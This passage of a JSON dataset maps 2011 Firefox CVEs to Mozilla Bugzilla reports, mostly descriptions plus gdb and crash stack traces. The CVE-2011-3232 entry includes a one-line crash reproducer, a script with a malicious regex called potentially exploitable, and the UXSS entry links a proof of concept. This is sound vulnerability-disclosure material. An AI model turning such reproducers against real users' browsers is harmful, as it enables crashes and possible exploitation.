        "description": "+++ This bug was initially created as a clone of Bug #665934 +++ We fixed the code issue from the first paragraph of bug 665934 comment 1 but did NOT fix \"the real issue\" from the second paragraph of that comment (as well as the bug summary) -- the return value of GrowAtomTable() is still not checked. If malloc/realloc fails (they can!) then later code does stupid unsafe things. First, GrowAtomTable() returns 0 for \"good\", -1 for \"bad\". Other int-returning functions (the various Init functions, for example) use 0 for bad and 1 for good. If it were checked this inconsistency is going to trip someone up. -> make GrowAtomTable() return 0 for failure, 1 for success. [InitPreProcessor() in cppstruct.c converts the InitAtomTable() return value into the opposite sense: 0 for success. Every other function in cppstruct.c returns 1 for success and 0 for failure] InitAtomTable() checks the allocation of atable->amap instead of the GrowAtomTable return code, but it's possible that the amap allocation succeeded and the arev allocation failed. It also may be possible that there's already an allocated table when IncreaseHashTableSize() calls InitAtomTable, and if the realloc fails then the original amap would be in place. 634 GrowAtomTable(atable, INIT_ATOM_TABLE_SIZE); 635 if (!atable->amap) 636 return 0; rewrite as if (!GrowAtomTable(atable, INIT_ATOM_TABLE_SIZE)) return 0; NB: I'm assuming you've swapped the return code as mentioned above If GrowAtomTable() fails inside AllocateAtom() then it'll start overwriting past the end of the allocated amap and arev buffers. Not sure what you should do if it does fail, maybe return 0 as the atom number? The problem is that all the callers of LookUpAddString (the only caller of AllocateAtom) simply assume success. Is there anything keeping a lid on nextFree or do we need to worry about integer overflow in GrowAtomTable(atable, atable->nextFree*2) ? There's further multiplication by sizeof(int) inside GrowAtomTable so we'd need a bit more than 500 Million atoms to overflow. Similar heap overflow and maybe integer overflow potential in AddAtomFixed"
      }
    ],
    "CVE-2011-3003": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=682335",
        "title": "Investigate crash [@ WebGLContext::BufferSubData_array]",
        "description": "Ben Hawkes reported the following to security@m.o yesterday. There are 31MB of uncompressed testcases (4MB compressed) so, for the purposes of this bug, I am going to remove the testcases beyond the one where he observes the crash. Otherwise I won't be able to attach the PoC to Bugzilla. I'll separately follow up with Ben to see if there is a way we can get the testcase generator and perhaps integrate it into our existing fuzzers. ------ Hi, I'm getting a reliable crash in WebGLContext::BufferSubData_array in Firefox 6.0 while doing some basic fuzzing of WebGL/GLESSL. I'm having some trouble finding the root-cause (presumably its a use-after-free), but since the crash looks exploitable I thought I'd get you guys involved early to help investigate further. The attached test cases are run sequentially from \"harness01.html\" (starting from test 3750.html) and I reliably see the crash at 4169.html on a Linux system using the proprietary NVidia driver. Stack trace as follows: Program received signal SIGSEGV, Segmentation fault. 0xf675e700 in mozilla::WebGLBuffer::CopySubDataIfElementArray (this=0x54ff8680, byteOffset=558000083, byteLength=16948, data=0xb7e01000) at /usr/include/bits/string3.h:52 52 return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest)); (gdb) x/i 0xf675e700 => 0xf675e700 <mozilla::WebGLBuffer::CopySubDataIfElementArray(GLuint, GLuint, void const*)+32>: rep movsb %ds:(%esi),%es:(%edi) (gdb) i r esi edi ecx esi 0xb7e01000 -1210052608 edi 0x214267d3 558000083 ecx 0x4234 16948 (gdb) x/bx 0x214267d3 0x214267d3: Cannot access memory at address 0x214267d3 (gdb) bt #0 0xf675e700 in mozilla::WebGLBuffer::CopySubDataIfElementArray (this=0x54ff8680, byteOffset=558000083, byteLength=16948, data=0xb7e01000) at /usr/include/bits/string3.h:52 #1 0xf674e540 in mozilla::WebGLContext::BufferSubData_array (this=0x1c3f32e0, target=34963, byteOffset=558000083, wa=0x53b70600) at /usr/local/google/source/firefox/firefox32/mozilla-release/content/canvas/src/WebGLContextGL.cpp:560 #2 0xf6b80ca8 in nsIDOMWebGLRenderingContext_BufferSubData (cx=0xe90b3290, argc=3, vp=0xf19ff0e8) at ../../../../dist/include/CustomQS_WebGL.h:208 #3 0xf72fe8f9 in CallCompiler::generateNativeStub() () from /source/firefox/firefox32/mozilla-release/objdir-ff-dbg32/dist/bin/libxul.so #4 0xf72fa26f in js::mjit::ic::NativeCall (f=..., ic=0x54ff8680) at /usr/local/google/source/firefox/firefox32/mozilla-release/js/src/methodjit/MonoIC.cpp:1026 #5 0xe49acf28 in ?? () #6 0xf72aba8c in EnterMethodJIT (cx=0x0, safePoint=0xe49661dc) at /usr/local/google/source/firefox/firefox32/mozilla-release/js/src/methodjit/MethodJIT.cpp:685 #7 CheckStackAndEnterMethodJIT (cx=0x0, safePoint=0xe49661dc) at /usr/local/google/source/firefox/firefox32/mozilla-release/js/src/methodjit/MethodJIT.cpp:715 #8 js::mjit::JaegerShotAtSafePoint (cx=0x0, safePoint=0xe49661dc) at /usr/local/google/source/firefox/firefox32/mozilla-release/js/src/methodjit/MethodJIT.cpp:742 #9 0xf7362522 in js::Interpret (cx=0xe90b3290, entryFrame=0xf19ff068, inlineCallCount=1, interpMode=js::JSINTERP_NORMAL) at /usr/local/google/source/firefox/firefox32/mozilla-release/js/src/jsinterp.cpp:6347 #10 0xf71788c1 in js::RunScript (cx=0xe90b3290, script=0x537ff900, fp=0xf19ff068) at /usr/local/google/source/firefox/firefox32/mozilla-release/js/src/jsinterp.cpp:613 #11 0xf71794a5 in js::Invoke (cx=0xe90b3290, argsRef=..., option=js::INVOKE_NORMAL) at /usr/local/google/source/firefox/firefox32/mozilla-release/js/src/jsinterp.cpp:694 etc Note: I was only able to reproduce this on 32-bit builds, my 64-bit build would not trigger this crash. Thanks, Ben"
      }
    ],
    "CVE-2011-3004": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=653926",
        "title": "loadSubScript is unwrapping XPCNativeWrapper scope parameter",
        "description": "User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0 mozIJSSubScriptLoader.loadSubScript’s behavior with XPCNativeWrapper scope parameters seems to have changed from 3.6.* to 4. Specifically in 4 if scope is a XPCNativeWrapper then it is unwrapping it. I have attached a simple HTML and JS file that demonstrates this, but the basic lines are pretty clear: The calling code is: Components.classes[\"@mozilla.org/moz/jssubscript-loader;1\"] .getService(Components.interfaces.mozIJSSubScriptLoader).loadSubScript(\"chrome://exampleext/content/firefox4loadsubscriptchange.min.js\",xpcnWrappedWindow); And the subscript code is simply: var windowTS = window.toString(); In 3.6.16 windowTS will be “[object XPCNativeWrapper [object Window]]”. In 4.0 it will be “Window”. I also have a slightly more elaborate case that verifies in the calling code that anything that is done to the window object is added to the wrapper in 3.6, but added directly to the unwrapped window in 4.0. The seems like a regression to me since loadSubScript is privileged itself so I don't see a reason for hiding the wrapped object from it. Also mentioned in this thread (but no replies): http://groups.google.com/group/mozilla.dev.platform/browse_thread/thread/6ac127f89432fb97/094bb532b6ca8fd7#094bb532b6ca8fd7 Reproducible: Always"
      }
    ],
    "CVE-2011-3005": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=675747",
        "title": "ogg crash [@ nsOggReader::ReadHeaders]",
        "description": "User Agent: Mozilla/5.0 (X11; U; Linux x86_64; c) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.30.6 Steps to reproduce: ran firefox on an .ogg file it seems like firefox crashes on any ogg file where the beginning of stream flag is set in the second page of a stream, i attached one example Actual results: firefox seg faults Expected results: firefox should just not play the video like it normally does for corrupted videos rather than seg faulting"
      }
    ],
    "CVE-2011-3079": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1087565",
        "title": "IPC Channel does not validate the listener.",
        "description": "We have have probably inherited CVE-2011-3079 from our import of Chromium's IPC code 5½ years ago. My understanding of this bug is: Chromium IPC endpoints have names, and knowing the name is sufficient to connect to it. These names were predictable and, on Windows, are reflected in the named pipe namespace which an untrusted process can traverse. The patch adds 32 bits of randomness to each name, and excludes that part from the pipe name on Windows. (Anyone with more knowledge of IPC is invited to correct this summary if needed.) There's also a patch on the bug which seems to not be directly related to the IPC issue itself, and has something to do with Windows security levels: https://crbug.com/117627#c18 +++ This bug was initially created as a clone of Bug #958895 +++ \"IPC Channel does not validate the listener.\" http://code.google.com/p/chromium/issues/detail?id=117627"
      }
    ],
    "CVE-2011-3232": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=653672",
        "title": "Reproducible crash at js::RegExp::executeInternal",
        "description": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 The crash looks like: Program received signal SIGSEGV, Segmentation fault. 0x00007fffe5d60967 in ?? () (gdb) x/i $rip 0x7fffe5d60967: cmpw $0xd,-0x4(%rdi,%rsi,2) (gdb) p $rdi $1 = 140736947844760 (gdb) p $rsi $2 = 2147483650 and the values varied while the testcase was being minimized. Reproducible: Always Steps to Reproduce: 1. $ echo '<script> \"\".match(/(?:(?=g))|(?:m).{2147483648,}/); </script>' > rex.html 2. ... 3. $ firefox rex.html Actual Results: Firefox crashes. Expected Results: Firefox remains running. Bug https://bugzilla.mozilla.org/show_bug.cgi?id=605998 sounds similar to this one, but since this is cleanly reproducible and looks potentially exploitable to me, filing this separately as a hidden bug to be on the safe side. Crash state dump at https://crash-stats.mozilla.com/report/index/140f49fb-e689-48ff-88b8-131f22110429"
      }
    ],
    "CVE-2011-3647": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=680880",
        "title": "Security problem with loadSubScript on 1.9.2 branch",
        "description": "On 1.9.2, using loadSubScript with a content object as the scope object is potentially unsafe. On 1.9.2, the parent chain of XPCNativeWrapper/SJOW reaches to a content window, thus the subscript can directly access content objects. For example: * An object created in the subscript is not a SJOW. * When the scope object is an XPCNativeWrapper, \"document\" is not an XPCNativeWrapper. in subscript: window.toString() -> [object XPCNativeWrapper [object Window]] window.document.toString() -> [object XPCNativeWrapper [object HTMLDocument]] document.toString() -> [object HTMLDocument]"
      }
    ],
    "CVE-2011-3648": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=690225",
        "title": "Universal XSS likely with MultiByte charset (e.g. japanese sites)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.0; rv:7.0) Gecko/20100101 Firefox/7.0 Build ID: 20110916091512 Steps to reproduce: JSON containing broken MBCS sequence allows hijacking by attacker. Attacker can read the secret contents of JSON across the domain if attacker can control some field in it. PoC is here: http://utf-8.jp/PoC/mbcs-json.html Actual results: Byte sequence \"0x82 0x22\" is invalid for Shift_JIS. therefore, it should be treated as 2 letters, such as \"(U+FFFD)(U+0022)\" but Firefox treats it as 1 letter so double quote trailing invalid lead byte is vanished. Expected results: Treat invalid byte sequence correctly like as UTF-8. in utf-8, \"0xC2 0x22\" is treated as 2 lettes, \"(U+FFFD)(U+0022)\"."
      }
    ],
    "CVE-2011-3649": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=655836",
        "title": "Information leakage between canvases and origins [Windows D2D]",
        "description": "User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Windows NT 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Information leakage between canvases and origins. Reproducible: Always Steps to Reproduce: 1. have a canvasA which is inserted into DOM tree and visible 2. draw green rect onto canvasA 3. have canvasB, which is not inserted into DOM tree 4. draw canvasA onto canvasB 5. draw red rect and different-origin image onto canvasA A repro implementation is attached. Actual Results: Red rect and different-origin image on canvasB (which has origin-clean flag true) if accessed 'later than immediately' Expected Results: Green rect and no different-origin image on canvasB (which has origin-clean flag true) - GPU: GeForce 9650M GT, Driver Version 270.61 - also reproducable in FF4.0 - bug does not occurs when canvasA meets any of the following conditions: . is not in DOM tree . has css display: none . has css visible: hidden . has css opacity less than 1 and the canvasA is not (fully?) overlayed by another element"
      }
    ],
    "CVE-2011-3650": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=674776",
        "title": "SIGSEGV while profiling page with many functions (JS debugging)",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 Steps to reproduce: open many66000.html 2) open firebug 3) do while not crash (and press continue on long running script) 3a) press \"OK\" (in hello box) 3b) press \"profile\" Actual results: Process: firefox-bin [6702] Path: /Applications/Firefox.app/Contents/MacOS/firefox-bin Identifier: org.mozilla.firefox Version: 5.0.1 (5.0.1) Code Type: X86-64 (Native) Parent Process: launchd [185] Date/Time: 2011-07-27 11:38:37.194 +0200 OS Version: Mac OS X 10.6.8 (10K540) Report Version: 6 Interval Since Last Report: 949111 sec Crashes Since Last Report: 962 Per-App Interval Since Last Report: 12453 sec Per-App Crashes Since Last Report: 9 Anonymous UUID: A20874EC-7280-445C-9882-755000F0127C Exception Type: EXC_BAD_ACCESS (SIGBUS) Exception Codes: KERN_PROTECTION_FAILURE at 0x0000000127a631ae Crashed Thread: 0 Dispatch queue: com.apple.main-thread Thread 0 Crashed: Dispatch queue: com.apple.main-thread 0 libSystem.B.dylib 0x00007fff826d7514 tiny_free_list_add_ptr + 124 1 libSystem.B.dylib 0x00007fff826d4c27 tiny_malloc_from_free_list + 1196 2 libSystem.B.dylib 0x00007fff826d3abd szone_malloc_should_clear + 242 3 libSystem.B.dylib 0x00007fff826d398a malloc_zone_malloc + 82 4 libSystem.B.dylib 0x00007fff826d1c88 malloc + 44 5 libmozalloc.dylib 0x0000000101ab39ac moz_xmalloc + 12 6 XUL 0x00000001009af604 xpc_LocalizeContext(JSContext*) + 75748 7 XUL 0x0000000100992f67 DumpJSValue + 81591 8 XUL 0x0000000100993826 DumpJSValue + 83830 9 XUL 0x00000001009a7639 xpc_LocalizeContext(JSContext*) + 43033 10 XUL 0x00000001009a1489 xpc_LocalizeContext(JSContext*) + 18025 11 XUL 0x0000000100e3c9c5 nsXPTCStubBase::Stub249() + 533 12 XUL 0x0000000100e3b84b NS_InvokeByIndex_P + 955 13 XUL 0x0000000100bc52bf JSD_DebuggerOnForUser + 49567 14 ??? 0x0000000135b72a10 0 + 5196163600 15 ??? 0x00000001279e5fb0 0 + 4959657904 16 ??? 0x000000011dfc5a58 0 + 4798044760 17 ??? 0x000000011fd464a0 0 + 4828980384 18 ??? 0x000000011da79580 0 + 4792489344 19 ??? 0x00000001029497d0 0 + 4338259920 20 ??? 0x000000011fd59540 0 + 4829058368 21 ??? 0x00000001029a58d0 0 + 4338637008 22 ??? 0x00000001029a3d20 0 + 4338629920 23 ??? 0x000000011fd68f10 0 + 4829122320 24 ??? 0x000000011fd75b70 0 + 4829174640 25 ??? 0x000000011fd7c6d0 0 + 4829202128 26 ??? 0x000000011fd84390 0 + 4829234064 27 ??? 0x000000011fd87550 0 + 4829246800 28 ??? 0x000000011fd893e0 0 + 4829254624 29 ??? 0x000000011fd8cee0 0 + 4829269728 30 ??? 0x000000011fd91780 0 + 4829288320 31 ??? 0x000000011fdcf590 0 + 4829541776 32 ??? 0x000000011fdd3060 0 + 4829556832 33 ??? 0x000000011fdd32f0 0 + 4829557488 34 ??? 0x000000011fdd38b0 0 + 4829558960 35 ??? 0x000000011fdd3930 0 + 4829559088 36 ??? 0x000000011fdd39f0 0 + 4829559280 37 ??? 0x000000011fdd3c90 0 + 4829559952 38 ??? 0x000000011fdd3e50 0 + 4829560400 39 ??? 0x000000011fdd41a0 0 + 4829561248 40 ??? 0x000000011fdd4260 0 + 4829561440 41 ??? 0x000000011fdd43a0 0 + 4829561760 42 ??? 0x000000011fdd46f0 0 + 4829562608 43 ??? 0x000000011fdd4af0 0 + 4829563632 44 ??? 0x000000011fdd4d10 0 + 4829564176 45 ??? 0x000000011fdc42a0 0 + 4829495968 46 ??? 0x000000011fdd4ff0 0 + 4829564912 47 ??? 0x000000011fdd5390 0 + 4829565840 48 ??? 0x000000011fdd5450 0 + 4829566032 49 ??? 0x000000011fdd57a0 0 + 4829566880 50 ??? 0x000000011fdd5880 0 + 4829567104 51 ??? 0x000000011fdd6290 0 + 4829569680 52 ??? 0x000000011fdd60f0 0 + 4829569264 53 ??? 0x000000011fdd61d0 0 + 4829569488 54 ??? 0x000000011fdd6a70 0 + 4829571696 55 ??? 0x000000011fdd6d20 0 + 4829572384 56 ??? 0x000000011fdd7580 0 + 4829574528 57 ??? 0x000000011fdd73f0 0 + 4829574128 58 ??? 0x000000011fdd74f0 0 + 4829574384 59 ??? 0x000000011fdd79a0 0 + 4829575584 60 ??? 0x000000011fdd7d40 0 + 4829576512 61 ??? 0x000000011fdd7e50 0 + 4829576784 62 ??? 0x000000011fdd8090 0 + 4829577360 63 ??? 0x000000011fdd83c0 0 + 4829578176 64 ??? 0x000000011fdd8540 0 + 4829578560 65 ??? 0x000000011fdd8670 0 + 4829578864 66 ??? 0x000000011fdd8860 0 + 4829579360 67 ??? 0x000000011fdd8f80 0 + 4829581184 68 ??? 0x000000011fdd9420 0 + 4829582368 69 ??? 0x000000011fdd8de0 0 + 4829580768 70 ??? 0x000000011fdd93a0 0 + 4829582240 71 ??? 0x000000011fdd9d90 0 + 4829584784 72 ??? 0x000000011fdd9df0 0 + 4829584880 73 ??? 0x000000011fdd9ed0 0 + 4829585104 74 ??? 0x000000011fdd9f50 0 + 4829585232 75 ??? 0x000000011fdda1f0 0 + 4829585904 76 ??? 0x000000011fdda2d0 0 + 4829586128 77 ??? 0x000000011fdda620 0 + 4829586976 78 ??? 0x000000011fdda710 0 + 4829587216 79 ??? 0x000000011fdda930 0 + 4829587760 80 ??? 0x000000011fddabc0 0 + 4829588416 81 ??? 0x000000011fddaf50 0 + 4829589328 82 ??? 0x000000011fddb060 0 + 4829589600 83 ??? 0x000000011fddb2b0 0 + 4829590192 84 ??? 0x000000011fddb570 0 + 4829590896 85 ??? 0x000000011fddbac0 0 + 4829592256 86 ??? 0x000000011fddbb60 0 + 4829592416 87 ??? 0x000000011fddbd60 0 + 4829592928 88 ??? 0x000000011fddc0e0 0 + 4829593824 89 ??? 0x000000011fddc370 0 + 4829594480 90 ??? 0x000000011fddc410 0 + 4829594640 91 ??? 0x000000011fddca80 0 + 4829596288 92 ??? 0x000000011fddc830 0 + 4829595696 93 ??? 0x000000011fddcd00 0 + 4829596928 94 ??? 0x000000011fddcd60 0 + 4829597024 95 ??? 0x000000011fddcf00 0 + 4829597440 96 ??? 0x000000011fddd170 0 + 4829598064 97 ??? 0x000000011fddda10 0 + 4829600272 98 ??? 0x000000011fdddae0 0 + 4829600480 99 ??? 0x000000011fddde00 0 + 4829601280 100 ??? 0x000000011fdddef0 0 + 4829601520 101 ??? 0x000000011fdde1c0 0 + 4829602240 102 ??? 0x000000011fdde380 0 + 4829602688 103 ??? 0x000000011fdde8b0 0 + 4829604016 104 ??? 0x000000011fdded90 0 + 4829605264 105 ??? 0x000000011fddee80 0 + 4829605504 106 ??? 0x000000011fddf0d0 0 + 4829606096 107 ??? 0x000000011fddf4c0 0 + 4829607104 108 ??? 0x000000011fddfc00 0 + 4829608960 109 ??? 0x000000011fddfd80 0 + 4829609344 110 ??? 0x000000011fde00f0 0 + 4829610224 111 ??? 0x000000011fde0200 0 + 4829610496 112 ??? 0x000000011fde0500 0 + 4829611264 113 ??? 0x000000011fde0760 0 + 4829611872 114 ??? 0x000000011fde0a30 0 + 4829612592 115 ??? 0x000000011fde0af0 0 + 4829612784 116 ??? 0x0000000102964730 0 + 4338370352 117 ??? 0x00000001029647d0 0 + 4338370512 118 ??? 0x000000011fde15b0 0 + 4829615536 119 ??? 0x000000011fde11a0 0 + 4829614496 120 ??? 0x000000011e657710 0 + 4804933392 121 ??? 0x000000011e644630 0 + 4804855344 122 ??? 0x000000011e37fc30 0 + 4801952816 123 ??? 0x000000011e39e240 0 + 4802077248 124 ??? 0x000000011e397090 0 + 4802048144 125 ??? 0x000000011ea80710 0 + 4809295632 126 ??? 0x000000011eabb1a0 0 + 4809535904 127 ??? 0x000000011e1c1c80 0 + 4800126080 128 ??? 0x000000011e36a480 0 + 4801864832 129 ??? 0x000000011e358fb0 0 + 4801793968 130 ??? 0x000000011e359010 0 + 4801794064 131 ??? 0x000000011e35bd90 0 + 4801805712 132 ??? 0x000000011e35bdf0 0 + 4801805808 133 ??? 0x000000011e35c4f0 0 + 4801807600 134 ??? 0x000000011e35c550 0 + 4801807696 135 ??? 0x000000011e35c8e0 0 + 4801808608 136 ??? 0x000000011e35f3f0 0 + 4801819632 137 ??? 0x000000011e3a0b10 0 + 4802087696 138 ??? 0x000000011e351160 0 + 4801761632 139 ??? 0x000000011e3511c0 0 + 4801761728 140 ??? 0x000000011e352f50 0 + 4801769296 141 ??? 0x000000011e353fa0 0 + 4801773472 142 ??? 0x000000011e354050 0 + 4801773648 143 ??? 0x000000011e356c70 0 + 4801784944 144 ??? 0x000000011e3440a0 0 + 4801708192 145 ??? 0x000000011e344140 0 + 4801708352 146 ??? 0x000000011e3457b0 0 + 4801714096 147 ??? 0x000000011e345810 0 + 4801714192 148 ??? 0x000000011e346830 0 + 4801718320 149 ??? 0x000000011e34d390 0 + 4801745808 150 ??? 0x000000011e34d440 0 + 4801745984 151 ??? 0x000000011e34e6a0 0 + 4801750688 152 ??? 0x000000011e34f220 0 + 4801753632 153 ??? 0x000000011e3501b0 0 + 4801757616 154 ??? 0x000000011e6b6620 0 + 4805322272 155 ??? 0x000000011e6b6680 0 + 4805322368 156 ??? 0x0000000101e8f080 0 + 4327010432 157 ??? 0x000000011e3ab570 0 + 4802131312 158 ??? 0x000000011e68a5b0 0 + 4805141936 159 ??? 0x000000011e68a610 0 + 4805142032 160 ??? 0x000000011e3ab1c0 0 + 4802130368 161 ??? 0x000000011e3b77e0 0 + 4802181088 162 ??? 0x000000011e3a8430 0 + 4802118704 163 ??? 0x000000011e3a8380 0 + 4802118528 164 ??? 0x000000011e3b9730 0 + 4802189104 165 ??? 0x000000011e3b6d50 0 + 4802178384 166 ??? 0x000000011e3b65e0 0 + 4802176480 167 ??? 0x000000011e3b6640 0 + 4802176576 168 ??? 0x000000011e3b5d60 0 + 4802174304 169 ??? 0x000000011e3b5dc0 0 + 4802174400 170 ??? 0x000000011e3b6110 0 + 4802175248 171 ??? 0x000000011e3b6170 0 + 4802175344 172 ??? 0x000000011e3ae6d0 0 + 4802143952 173 ??? 0x000000011e3be590 0 + 4802209168 174 ??? 0x000000011e3bdb50 0 + 4802206544 175 ??? 0x000000011e3bdaa0 0 + 4802206368 176 ??? 0x000000011e3be4e0 0 + 4802208992 177 ??? 0x000000011e622b50 0 + 4804717392 178 ??? 0x000000011e622040 0 + 4804714560 179 ??? 0x000000011e6220d0 0 + 4804714704 180 ??? 0x000000011e61fac0 0 + 4804704960 181 ??? 0x000000011e61f6e0 0 + 4804703968 182 ??? 0x000000011e61f740 0 + 4804704064 183 ??? 0x000000011e61ebd0 0 + 4804701136 184 ??? 0x000000011e61ec60 0 + 4804701280 185 ??? 0x000000011e61dd40 0 + 4804697408 186 ??? 0x000000011e61dda0 0 + 4804697504 187 ??? 0x000000011e61d9c0 0 + 4804696512 188 ??? 0x000000011e62d660 0 + 4804761184 189 ??? 0x000000011e62d6e0 0 + 4804761312 190 ??? 0x000000011e62ba10 0 + 4804753936 191 ??? 0x000000011e628700 0 + 4804740864 192 ??? 0x000000011e628790 0 + 4804741008 193 ??? 0x000000011e627fa0 0 + 4804738976 194 ??? 0x000000011e625f20 0 + 4804730656 195 ??? 0x000000011e625f80 0 + 4804730752 196 ??? 0x000000011e6247b0 0 + 4804724656 197 ??? 0x000000011e624850 0 + 4804724816 198 ??? 0x000000011e63e490 0 + 4804830352 199 ??? 0x000000011e63e520 0 + 4804830496 200 ??? 0x000000011e650f80 0 + 4804906880 201 ??? 0x000000011e6507f0 0 + 4804904944 202 ??? 0x000000011e650850 0 + 4804905040 203 ??? 0x000000011e64f560 0 + 4804900192 204 ??? 0x000000011e64f5e0 0 + 4804900320 205 ??? 0x000000011e64d070 0 + 4804890736 206 ??? 0x000000011e64c270 0 + 4804887152 207 ??? 0x000000011e64be80 0 + 4804886144 208 ??? 0x000000011e64bf30 0 + 4804886320 209 ??? 0x000000011e64b880 0 + 4804884608 210 ??? 0x000000011e64a970 0 + 4804880752 211 ??? 0x000000011e64aa00 0 + 4804880896 212 ??? 0x000000011e659200 0 + 4804940288 213 ??? 0x000000011e659290 0 + 4804940432 214 ??? 0x000000011e658360 0 + 4804936544 215 ??? 0x000000011e656ed0 0 + 4804931280 216 ??? 0x000000011e656350 0 + 4804928336 217 ??? 0x000000011e654c60 0 + 4804922464 218 ??? 0x000000011e653270 0 + 4804915824 219 ??? 0x000000011e653300 0 + 4804915968 220 ??? 0x000000011e65ce30 0 + 4804955696 221 ??? 0x000000011e65ca80 0 + 4804954752 222 ??? 0x000000011e65cb10 0 + 4804954896 223 ??? 0x000000011e65b6d0 0 + 4804949712 224 ??? 0x000000011e65b2e0 0 + 4804948704 225 ??? 0x000000011e65a7a0 0 + 4804945824 226 ??? 0x000000011e65a800 0 + 4804945920 227 ??? 0x000000011e659fc0 0 + 4804943808 228 ??? 0x000000011e65a050 0 + 4804943952 229 ??? 0x000000011e663e90 0 + 4804984464 230 ??? 0x000000011e662090 0 + 4804976784 231 ??? 0x000000011e6620f0 0 + 4804976880 232 ??? 0x000000011e660cd0 0 + 4804971728 233 ??? 0x000000011e6608f0 0 + 4804970736 234 ??? 0x000000011e660950 0 + 4804970832 235 ??? 0x000000011e660540 0 + 4804969792 236 ??? 0x000000011e6605d0 0 + 4804969936 237 ??? 0x000000011e6601c0 0 + 4804968896 238 ??? 0x000000011e65f790 0 + 4804966288 239 ??? 0x000000011e65f820 0 + 4804966432 240 ??? 0x000000011e65e390 0 + 4804961168 241 ??? 0x000000011e65dfe0 0 + 4804960224 242 ??? 0x000000011e65e040 0 + 4804960320 243 ??? 0x000000011e668ea0 0 + 4805004960 244 ??? 0x000000011e668f00 0 + 4805005056 245 ??? 0x000000011e6680f0 0 + 4805001456 246 ??? 0x000000011e668180 0 + 4805001600 247 ??? 0x000000011e667740 0 + 4804998976 248 ??? 0x000000011e666be0 0 + 4804996064 249 ??? 0x000000011e666c90 0 + 4804996240 250 ??? 0x000000011e6668a0 0 + 4804995232 251 ??? 0x000000011e665640 0 + 4804990528 252 ??? 0x000000011e665260 0 + 4804989536 253 ??? 0x000000011e665300 0 + 4804989696 254 ??? 0x000000011e66e730 0 + 4805027632 255 ??? 0x000000011e66dd40 0 + 4805025088 256 ??? 0x000000011e66d300 0 + 4805022464 257 ??? 0x000000011e66c8d0 0 + 4805019856 258 ??? 0x000000011e66c930 0 + 4805019952 259 ??? 0x000000011e66ba50 0 + 4805016144 260 ??? 0x000000011e66b6e0 0 + 4805015264 261 ??? 0x000000011e66af40 0 + 4805013312 262 ??? 0x000000011e66b2b0 0 + 4805014192 263 ??? 0x000000011e6733b0 0 + 4805047216 264 ??? 0x000000011e672c50 0 + 4805045328 265 ??? 0x000000011e672cb0 0 + 4805045424 266 ??? 0x000000011e670ea0 0 + 4805037728 267 ??? 0x000000011e66ea80 0 + 4805028480 268 ??? 0x000000011e66eae0 0 + 4805028576 269 ??? 0x000000011e66fcf0 0 + 4805033200 270 ??? 0x000000011e6790e0 0 + 4805071072 271 ??? 0x000000011e676bf0 0 + 4805061616 272 ??? 0x000000011e676f60 0 + 4805062496 273 ??? 0x000000011e676fc0 0 + 4805062592 274 ??? 0x000000011e678d60 0 + 4805070176 275 ??? 0x000000011e6786e0 0 + 4805068512 276 ??? 0x000000011e678790 0 + 4805068688 277 ??? 0x000000011e6767f0 0 + 4805060592 278 ??? 0x000000011e675e20 0 + 4805058080 279 ??? 0x000000011e674620 0 + 4805051936 280 ??? 0x000000011e6746a0 0 + 4805052064 281 ??? 0x000000011e673b70 0 + 4805049200 282 ??? 0x000000011e67d9b0 0 + 4805089712 283 ??? 0x000000011e67da10 0 + 4805089808 284 ??? 0x000000011e67b640 0 + 4805080640 285 ??? 0x000000011e67b290 0 + 4805079696 286 ??? 0x000000011e67b2f0 0 + 4805079792 287 ??? 0x000000011e6c2040 0 + 4805369920 288 ??? 0x000000011ea3cc10 0 + 4809018384 289 ??? 0x000000011ea3cc70 0 + 4809018480 290 ??? 0x000000011e34acd0 0 + 4801735888 291 ??? 0x000000011e36db40 0 + 4801878848 292 ??? 0x000000011e3a7a50 0 + 4802116176 293 ??? 0x000000011e3a7ae0 0 + 4802116320 294 ??? 0x000000011e3f5fa0 0 + 4802437024 295 ??? 0x000000011e3f6060 0 + 4802437216 296 ??? 0x000000011e629890 0 + 4804745360 297 ??? 0x000000011e64a5b0 0 + 4804879792 298 ??? 0x000000011e35a090 0 + 4801798288 299 ??? 0x000000011e64fed0 0 + 4804902608 300 ??? 0x000000011e6847c0 0 + 4805117888 301 ??? 0x000000011ea1bd40 0 + 4808883520 302 ??? 0x000000011ea1bdf0 0 + 4808883696 303 ??? 0x000000011e3555d0 0 + 4801779152 304 ??? 0x000000011e3dba20 0 + 4802329120 305 ??? 0x000000011e3dbab0 0 + 4802329264 306 ??? 0x000000011e3dbd00 0 + 4802329856 307 ??? 0x000000011e688970 0 + 4805134704 308 ??? 0x000000011e6889d0 0 + 4805134800 309 ??? 0x000000011e6c2900 0 + 4805372160 310 ??? 0x000000011ea0dec0 0 + 4808826560 311 ??? 0x000000011ea0df80 0 + 4808826752 312 ??? 0x000000011e3629b0 0 + 4801833392 313 ??? 0x000000011e364350 0 + 4801839952 314 ??? 0x000000011e364420 0 + 4801840160 315 ??? 0x000000011e369410 0 + 4801860624 316 ??? 0x000000011e3739f0 0 + 4801903088 317 ??? 0x000000011e372780 0 + 4801898368 318 ??? 0x000000011e372810 0 